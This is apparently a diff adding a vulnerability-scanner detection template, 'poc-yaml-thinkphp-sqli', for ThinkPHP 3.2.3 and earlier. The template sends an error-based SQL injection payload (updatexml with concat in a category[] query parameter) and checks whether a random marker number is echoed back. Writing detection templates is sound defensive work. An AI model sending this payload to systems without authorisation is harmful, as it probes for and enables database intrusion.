@@ -1,0 +1,16 @@
+name: poc-yaml-thinkphp-sqli
+
+set:
+  r: randomInt(800000000, 1000000000)
+
+rules:
+  - method: GET
+    path: /Home/Index/readcategorymsg?category[0]=bind&category[1]=0 and (updatexml(1,concat(0x7e,({{r}}),0x7e),0))
+    expression: |
+      response.status == 404 && response.body.bcontains(bytes(string(r)))
+
+detail:
+  author: durkworf(https://github.com/durkworf)
+  Affected Version: "<= 3.2.3"
+  links:
+    - https://github.com/Medicean/VulApps/tree/master/t/thinkphp/1
